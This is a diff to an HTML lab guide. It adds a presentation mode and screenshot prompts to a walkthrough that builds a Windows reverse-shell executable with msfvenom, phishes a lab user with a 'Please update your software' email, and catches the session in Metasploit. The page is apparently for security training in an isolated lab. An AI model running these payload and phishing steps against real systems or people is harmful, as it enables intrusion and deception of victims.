@@ -224,6 +224,9 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 .env-table td code,.env-table th code{font-family:var(--mono);font-size:.86em}
 .env-table tbody tr:hover{background:var(--card-2)}
 .env-note{color:var(--muted);font-size:.86rem;margin-top:6px}
+
+html[data-present="on"] .container > .callout{display:none!important}
+html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!important}
 </style>
 </head>
 <body>
@@ -383,17 +386,18 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="step"><p><span class="snum">4</span> In the Terminal window, type the command cd Documents, then press Enter to go to the folder where our partial malicious executable is saved.</p>
 </div>
 <div class="step"><p><span class="snum">5</span> While inside the Documents directory, run the command cat main.cpp to check the content of our malicious file.</p>
-<div class="callout tip"><span class="tag">[NOTE]</span> Notice the two orange boxes in the picture below, we will be filling them later, based on the payload we created. The green box is what the user sees when the program is running.</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Payload built.</span> The msfvenom output showing the shellcode and its byte count.</span></div>
+<div class="callout tip"><span class="tag">[NOTE]</span> Notice the two spots in the code, we will be filling them later, based on the payload we created. the highlighted box is what the user sees when the program is running.</div>
 </div>
 <div class="step"><p><span class="snum">6</span> We will use msfvenom to generate our payload. Type the command below:</p>
 <div class="code-block"><span class="pr">kali@kali$</span> msfvenom -p windows/x64/shell_reverse_tcp LHOST=203.0.113.2 LPORT=4444
 -f c</div>
 </div>
-<div class="step"><p><span class="snum">7</span> Note the number 460 showing in the first orange box. Then, drag the mouse cursor to highlight the quoted area (the content in the second orange box), and press Ctrl + Shift + C to copy the payload.</p>
+<div class="step"><p><span class="snum">7</span> Note the number 460 shown in the output. Then, drag the mouse cursor to highlight the quoted area (the highlighted payload content), and press Ctrl + Shift + C to copy the payload.</p>
 </div>
 <div class="step"><p><span class="snum">8</span> Type sudo nano -l main.cpp to edit the code. When prompted for the password, enter kali.</p>
 </div>
-<div class="step"><p><span class="snum">9</span> In the new window, use the arrow keys to move the cursor to line 5, then press Ctrl + Shift + V to paste the payload. Check the number showing in the orange box; make sure it is the same number as we saw in step 6.</p>
+<div class="step"><p><span class="snum">9</span> In the new window, use the arrow keys to move the cursor to line 5, then press Ctrl + Shift + V to paste the payload. Check the number shown; make sure it is the same number as we saw in step 6.</p>
 </div>
 <div class="step"><p><span class="snum">10</span> Press Ctrl + S to save the file, then Ctrl + X to exit.</p>
 </div>
@@ -416,6 +420,8 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">2</span> In the Terminal window, ping the WinOS machine, we can see that the machine is not accessible.</p>
 <div class="code-block"><span class="pr">kali@kali$</span> ping -c4 192.168.0.50</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Foothold proven.</span> <code class="inl">whoami</code> and <code class="inl">ipconfig</code> showing 192.168.0.50 inside the intranet.</span></div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Firewall confirmed.</span> <code class="inl">ping -c4 192.168.0.50</code> with 100% packet loss.</span></div>
 <div class="callout tip"><span class="tag">[NOTE]</span> In the lab topology, the WAN is considered as the internet (outside world). Then we have the Demilitarized Zone, which interacts with the internet and the intranet. The LAN network is the company's intranet, where it has access to the internet, but the internet cannot initialize the connection to the LAN network.</div>
 </div>
 <div class="step"><p><span class="snum">3</span> We will now use a compromised email account to gain access to the LAN network. In the Kali box, start a Firefox browser. Go to the address: http://172.16.1.10/mail</p>
@@ -426,9 +432,10 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">6</span> We will now send the malicious executable to the lab-user account that uses the WinOS machine. In the browser, click the Compose button.</p>
 </div>
-<div class="step"><p><span class="snum">7</span> In the compose page, put the recipient address as wsmith@mail.netlab.local , subject as Please update your software, then click the HTML button underneath the word Subject.</p>
+<div class="step"><p><span class="snum">7</span> In the compose page, put the recipient address as wsmith@mail.netlab.local, subject as Please update your software, then click the HTML button underneath the word Subject.</p>
 </div>
-<div class="step"><p><span class="snum">8</span> This will turn on the Editor mode, type the information as shown in the picture below. Then, highlight the word HERE and click the Insert/Edit link button.</p>
+<div class="step"><p><span class="snum">8</span> This will turn on the Editor mode, type the information. Then, highlight the word HERE and click the Insert/Edit link button.</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Lure sent.</span> The composed email with the HERE link, before sending.</span></div>
 </div>
 <div class="step"><p><span class="snum">9</span> In the Insert link window, fill in the Url with the address link to our zipped malicious file. Click OK.</p>
 </div>
@@ -440,6 +447,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">2</span> In your Metasploit console, type the command below to use a handler.</p>
 <div class="code-block"><span class="pr">msf6&gt;</span> use exploit/multi/handler</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Listener up.</span> The handler reporting "Started reverse TCP handler."</span></div>
 </div>
 <div class="step"><p><span class="snum">3</span> Notice from the last step, it prompted that the payload is defaulting to generic/shell_reverse_tcp; this payload will not handle our 64-bit windows reverse shell, so let's change it by entering the following command and pressing Enter. msf6 exploit(multi/handler)&gt; set payload windows/x64/shell_reverse_tcp</p>
 </div>
@@ -484,6 +492,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="step"><p><span class="snum">15</span> A new window will come up, saying that the program is updating in the background</p>
 </div>
 <div class="step"><p><span class="snum">16</span> Switch back to the kali machine, you will see the Metasploit framework window now has a session opened.</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Session opened.</span> msfconsole showing the new session when the victim ran the file.</span></div>
 </div>
 <div class="step"><p><span class="snum">17</span> Now that we have control of the WinOS, type the whoami command to see who we are logged in as.</p>
 </div>
@@ -890,6 +899,7 @@ html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:
     if (!sections.length) return;
     idx = Math.max(0, Math.min(sections.length - 1, i));
     sections.forEach(function (s, n) { s.classList.toggle("pm-current", n === idx); });
+    root.setAttribute("data-pm-index", String(idx));
     if (countEl) countEl.textContent = (idx + 1) + " / " + sections.length;
     if (nameEl) nameEl.textContent = labelFor(sections[idx]);
     if (prevBtn) prevBtn.disabled = idx === 0;
@@ -911,6 +921,7 @@ html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:
   function exit() {
     root.removeAttribute("data-present");
     sections.forEach(function (s) { s.classList.remove("pm-current"); });
+    root.removeAttribute("data-pm-index");
     if (dock) dock.setAttribute("aria-hidden", "true");
     var btn = document.getElementById("pmToggle");
     if (btn) { btn.setAttribute("aria-pressed", "false");
